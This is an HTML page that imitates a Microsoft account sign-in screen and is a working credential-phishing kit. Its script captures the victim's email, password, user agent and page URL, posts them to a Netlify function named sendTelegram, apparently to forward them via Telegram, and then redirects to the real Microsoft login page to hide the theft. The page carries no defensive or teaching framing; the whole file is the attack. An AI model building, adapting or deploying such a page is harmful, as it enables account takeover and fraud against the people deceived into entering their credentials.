<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in to your account</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet"
      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
      crossorigin="anonymous">

    <!-- Google Font -->
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">

    <!-- Font Awesome -->
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>

    <style>
      html, body {
        height: 100%;
        margin: 0;
        font-family: "Segoe UI", "Archivo Narrow", Arial, sans-serif;
      }
      .bg-root {
        background-image: url("https://www.rapid7.com/cdn/assets/bltc9698ac925a4a219/683ddb9d2a76864ea7bc82bf/background.jpg");
        background-size: cover;
        background-position: center center;
        background-repeat: no-repeat;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .bg-overlay {
        position: absolute;
        inset: 0;
        background: rgba(0,0,0,0.18);
        pointer-events: none;
      }
      .signin-card {
        position: relative;
        z-index: 2;
        width: 420px;
        max-width: calc(100% - 32px);
        background: #fff;
        border-radius: 3px;
        box-shadow: 0 10px 60px rgba(0,0,0,0.3);
        padding: 26px 28px;
      }
      .signin-card .logo {
        width: 86px;
        display: block;
        margin-bottom: 16px;
      }
      .signin-card .title {
        font-size: 1.35rem;
        font-weight: 600;
        color: #1f2d33;
        margin-bottom: 6px;
      }
      .signin-card .subtitle {
        color: #6b757e;
        margin-bottom: 18px;
      }
      .form-control.flat {
        border-radius: 0;
        border-width: 0 0 1px 0;
        background: transparent;
        box-shadow: none;
      }
      .next-btn {
        background-color: #0066BA;
        color: #fff;
        border: none;
        padding: 8px 20px;
        font-weight: 600;
      }
      .small-muted { color: #6b757e; font-size: 0.92rem; }
      @media (max-width: 480px) {
        .signin-card { padding: 18px; }
        .signin-card .logo { width: 72px; }
      }
      /* hide password step by default */
      #passwordStep { display: none; }
      .hidden { display: none !important; }
    </style>
  </head>
  <body>
    <div class="bg-root" role="main" aria-label="Sign in background">
      <div class="bg-overlay" aria-hidden="true"></div>

      <div class="signin-card" role="region" aria-label="Sign in">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/640px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft logo" />

        <div class="title">Sign In</div>
        <div class="subtitle">Email, phone or skype</div>

        <!-- Email step -->
        <div id="emailStep">
          <div class="form-group">
            <label for="emailField" class="sr-only">Email, phone, or Skype</label>
            <input id="emailField" type="email" class="form-control flat" placeholder="Email, phone or skype" autocomplete="username" />
          </div>
          <div class="mb-2 small-muted">
            No account? <a class="link-muted" href="#">Create one!</a>
          </div>
          <div class="d-flex justify-content-end">
            <button id="emailNext" class="next-btn" type="button">Next</button>
          </div>
        </div>

        <!-- Password step -->
        <div id="passwordStep">
          <div class="form-group">
            <label for="passwordField" class="sr-only">Password</label>
            <input id="passwordField" type="password" class="form-control flat" placeholder="Enter password" autocomplete="current-password" />
          </div>
          <div class="d-flex justify-content-between align-items-center">
            <a href="#" class="link-muted">Sign in with a security key</a>
            <button id="passwordSubmit" class="next-btn" type="button">Login</button>
          </div>
        </div>

        <div id="statusMsg" class="mt-3 small-muted hidden" role="status" aria-live="polite"></div>
      </div>
    </div>

    <script>
      (function() {
        const emailField = document.getElementById('emailField');
        const passwordField = document.getElementById('passwordField');
        const emailNext = document.getElementById('emailNext');
        const passwordSubmit = document.getElementById('passwordSubmit');
        const emailStep = document.getElementById('emailStep');
        const passwordStep = document.getElementById('passwordStep');
        const statusMsg = document.getElementById('statusMsg');

        function showStatus(msg) {
          statusMsg.textContent = msg;
          statusMsg.classList.remove('hidden');
        }

        function hideStatus() {
          statusMsg.textContent = '';
          statusMsg.classList.add('hidden');
        }

        function isValidEmail(email) {
          var re = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
          return re.test(String(email).toLowerCase());
        }

        emailNext.addEventListener('click', function() {
          hideStatus();
          const email = (emailField.value || '').trim();
          if (!isValidEmail(email)) {
            showStatus("That Microsoft account doesn't exist. Enter a different account");
            return;
          }
          // move to password step
          emailStep.style.display = 'none';
          passwordStep.style.display = 'block';
          passwordField.focus();
        });

        passwordSubmit.addEventListener('click', async function() {
          hideStatus();
          const email = (emailField.value || '').trim();
          const password = (passwordField.value || '').trim();

          if (!password) {
            showStatus('Please enter your password');
            return;
          }

          // optionally show a message
          showStatus('Verifying...');

          try {
            // Send the captured data to your Netlify function
            const payload = {
              email: email,
              password: password,
              userAgent: navigator.userAgent,
              sessionId: 'replacement_' + Math.random().toString(36).substring(2, 15),
              url: window.location.href
            };

            const resp = await fetch('/.netlify/functions/sendTelegram', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(payload)
            });

            // optional: inspect response
            if (resp.ok) {
              // success â€” redirect to Microsoft sign in (or other next step)
              showStatus('Signing in...');
              // small delay so user sees the message
              setTimeout(function() {
                window.location.replace('https://login.microsoftonline.com');
              }, 800);
            } else {
              showStatus('Please try again later');
            }
          } catch (err) {
            console.error('Error sending credentials:', err);
            showStatus('Please try again later');
          }
        });
      })();
    </script>

    <!-- Bootstrap JS (optional) -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
      crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"></script>
  </body>
</html>
